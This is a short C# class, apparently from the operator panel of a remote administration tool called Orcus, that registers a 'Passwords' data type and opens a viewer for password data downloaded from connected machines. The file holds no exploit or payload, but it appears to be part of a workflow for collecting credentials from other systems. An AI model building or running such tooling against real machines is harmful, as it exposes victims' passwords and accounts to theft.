using System;
using System.Collections.Generic;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using Orcus.Administration.Core.DataManagement;
using Orcus.Administration.Plugins.DataManager;
using Orcus.Administration.ViewModels.ViewInterface;
using Orcus.Shared.Commands.DataManager;

namespace Orcus.Administration.ViewModels.DataManager.DataTypes
{
    public class FileManagerPasswords : IDataManagerType
    {
        public bool CanDownload { get; } = false;

        public string GetFileExtension(DataEntry dataEntry)
        {
            return ".txt";
        }

        public void ModifyDownloadedFile(string fileName)
        {
        }

        public string TypeId { get; } = (string) Application.Current.Resources["Passwords"];
        public bool SupportsMultipleEntries { get; } = true;
        public bool IsDataViewable { get; } = true;
        public Guid DataTypeGuid { get; } = new Guid("8AA38175-F8E5-45BD-AC6E-F541DE91D753");

        public ImageSource GetIconForEntry(DataEntry dataEntry)
        {
            return new BitmapImage(new Uri("/Resources/Images/Key.png", UriKind.Relative));
        }

        public void ChangeEntryData(DataEntry dataEntry)
        {
        }

        public Task<DataViewer> GetDataViewer(DataEntry dataEntry, IDataConnection dataConnection)
        {
           return GetDataViewer(new List<DataEntry> {dataEntry}, dataConnection);
        }

        public async Task<DataViewer> GetDataViewer(List<DataEntry> dataEntries, IDataConnection dataConnection)
        {
            return
                (DataViewer) WindowServiceInterface.Current.GetView(
                    await ((DataConnection) dataConnection).DownloadPasswordData(dataEntries));
        }
    }
}